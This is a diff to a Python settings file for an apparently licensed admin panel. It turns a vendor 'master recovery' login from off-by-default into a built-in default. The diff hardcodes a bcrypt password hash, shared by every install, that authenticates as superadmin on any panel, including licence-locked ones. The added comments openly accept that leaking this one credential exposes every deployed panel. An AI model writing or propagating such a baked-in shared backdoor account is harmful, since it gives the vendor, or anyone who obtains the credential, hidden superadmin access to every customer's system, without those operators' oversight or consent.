@@ -127,13 +127,22 @@ class Settings(BaseSettings):
     # How often to heartbeat, in minutes.
     license_heartbeat_minutes: int = int(os.environ.get("LICENSE_HEARTBEAT_MINUTES", "180"))
     # Vendor recovery login ("رمز مادر" - see routers/auth.py). A bcrypt
-    # hash of a password only the vendor holds; empty (default) = the whole
-    # feature is off and there is NO backdoor on a normal install. When set,
-    # logging in with master_recovery_username + that password authenticates
-    # as the panel's superadmin, works even on a licence-locked panel, and
-    # is logged. Generate the hash with backend/scripts/hash_recovery.py.
+    # hash of a password only the vendor holds. Baked in as the DEFAULT here
+    # (not empty) so every panel - every existing install once it updates to
+    # this code, and every new install - has it active out of the box, with
+    # no per-server setup. Deliberate tradeoff, decided 2026-09-05: a single
+    # shared credential across every deployed panel instead of a per-server
+    # one, so it never needs re-enabling by hand; if this exact hash/password
+    # is ever compromised, EVERY panel is reachable with it, not just one -
+    # that risk was accepted knowingly in exchange for zero-setup access.
+    # Override per-install via MASTER_RECOVERY_USERNAME/
+    # MASTER_RECOVERY_PASSWORD_HASH in backend/.env if a specific panel ever
+    # needs its own distinct recovery credential instead of the shared one.
     master_recovery_username: str = os.environ.get("MASTER_RECOVERY_USERNAME", "__vendor__")
-    master_recovery_password_hash: str = os.environ.get("MASTER_RECOVERY_PASSWORD_HASH", "")
+    master_recovery_password_hash: str = os.environ.get(
+        "MASTER_RECOVERY_PASSWORD_HASH",
+        "$2b$12$ua5CcSAXKLcul/ntY08Ws.tB1ftzWB5zG9M2OzqeZ1lR4OPmtfaEO",
+    )
 
     # THE VENDOR'S OWN install. When true, the licence is never enforced on
     # this panel - it is the master, the one that hosts the control console,
